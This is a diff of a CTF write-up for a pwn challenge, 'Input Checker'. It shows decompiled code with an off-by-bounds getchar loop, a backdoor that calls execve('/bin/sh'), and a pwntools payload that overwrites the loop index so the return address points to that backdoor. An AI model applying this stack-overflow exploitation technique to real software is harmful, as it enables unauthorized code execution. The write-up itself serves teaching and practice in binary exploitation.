@@ -1,7 +1,12 @@
+## Input Checker (100pt)
 
-## input
 ### Description
 
+> Finding the best input.
+> 
+> `nc 35.186.153.116 5001`
+> 
+> Author: Tux
 
 ### Attachment
 
@@ -12,7 +17,34 @@
 #### buffer overflow
 
 ```c
-__int64 __fastcall main(__int64 a1, char **a2, char **a3){
+  for ( j = 0; j <= 1089; ++j ){
+    chr = getchar();
+    v7[j] = chr;
+  }
+```
+
+>  do `getchar` 1089 times while `v7` is only 1008 bytes 
+
+After the `for loop`, variables after `v7` will be overwritten.
+
+#### back door
+
+`execve("/bin/sh",0,0)` in `0x00401253`:
+
+```nasm
+0x00401253      ba00000000     mov edx, 0
+0x00401258      be00000000     mov esi, 0
+0x0040125d      488d3dae0d00.  lea rdi, str.bin_sh         ; 0x402012 ; "/bin/sh"
+0x00401264      e837feffff     call sym.imp.execve
+```
+
+### Solution
+
+#### Stack layout
+
+We should focus on the stack layout after `v7` :
+
+```c
   unsigned int v3; // eax
   __int64 v4; // rax
   char fd; // [rsp+0h] [rbp-640h]
@@ -26,43 +58,44 @@ __int64 __fastcall main(__int64 a1, char **a2, char **a3){
   __int64 const_4; // [rsp+620h] [rbp-20h]
   int j; // [rsp+628h] [rbp-18h]
   int i; // [rsp+62Ch] [rbp-14h]
+```
 
-  const_4 = 4LL;
-  v3 = sub_401371(8u, 4);
-  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&fd, "/dev/urandom", v3);
-  for ( i = 0; i <= 4; ++i )
-    std::istream::read(&fd, &rnd1 + 4 * i, const_4);
-  if ( rnd1 == rnd2 && rnd2 == rnd3 && rnd3 == rnd4 && rnd4 == rnd5 )
-    execve("/bin/sh", 0LL, 0LL);
-  std::operator<<<std::char_traits<char>>(&std::cout, "Input: ");
-  for ( j = 0; j <= 1089; ++j )
-  {
+in gdb:
+
+![](http://image.taqini.space/img/20200427013321.png)
+
+`j` is the **index** of `v7` as well as the variable controlling the `for loop` 
+
+We can overwrite 1 byte of `j` after 1048 times `getchar`
+
+```c
+  for ( j = 0; j <= 1089; ++j ){
     chr = getchar();
     v7[j] = chr;
   }
-  v4 = std::operator<<<std::char_traits<char>>(&std::cout, v7);
-  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
-  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&fd);
-  return 0LL;
-}
 ```
 
-`getchar` 1089 times to `v7[1008]`
+Here is the stack layout while j is 1048: 
 
-### Solution
+![](http://image.taqini.space/img/20200427015128.png)
+
+We can overwrite the last byte of `j` to `0x37` ,so that `j` become `0x438` after `j++`
+
+> `v7[0x438]` is the address of the return address
+
+#### ret2backdoor
+
+In the next 8 times `getchar`, return address in stack will be overwritten with address of backdoor:
 
 ```python
 offset = 1048
 payload = cyclic(offset)
 payload += '\x37'
-payload += p64(0x0401253)
+payload += p64(0x0401253) # backdoor
 payload = payload.ljust(0x441,'A')
 # debug('b *0x40129e')
 sl(payload)
 ```
-
-
-
 
 ### More
 
